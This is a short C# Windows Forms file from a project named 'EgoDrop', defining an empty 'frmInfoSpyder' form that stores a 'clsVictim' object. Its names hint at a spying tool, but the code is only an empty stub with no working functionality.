using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace EgoDrop
{
    public partial class frmInfoSpyder : Form
    {
        private clsVictim m_victim { get; set; }

        public frmInfoSpyder(clsVictim victim)
        {
            InitializeComponent();

            m_victim = victim;
        }

        private void fnSetup()
        {

        }

        private void frmInfoSpyder_Load(object sender, EventArgs e)
        {
            fnSetup();
        }
    }
}
